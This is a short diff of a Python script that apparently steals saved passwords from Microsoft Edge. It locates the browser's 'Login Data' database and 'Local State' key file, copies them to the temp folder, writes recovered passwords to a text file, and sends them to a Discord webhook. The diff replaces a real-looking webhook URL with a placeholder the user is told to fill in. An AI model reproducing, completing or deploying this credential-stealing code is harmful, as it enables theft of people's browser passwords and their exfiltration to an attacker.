@@ -1,3 +1,4 @@
+# see the requirements before running
 import os
 import sqlite3
 import json
@@ -10,7 +11,7 @@ from Cryptodome.Cipher import AES
 EDGE_PATH = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
 TEMP_PATH = os.path.join(os.getenv("TEMP"), "LoginDataCopy.db")
 PASSWORDS_PATH = os.path.join(os.getenv("TEMP"), "passwords.txt")
-WEBHOOK_URL = "https://discord.com/api/webhooks/1342263122156720139/made-by-sholmx-on-github"
+WEBHOOK_URL = "webhook" # change to ur webhook 
 
 def get_encryption_key():
     key_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State")
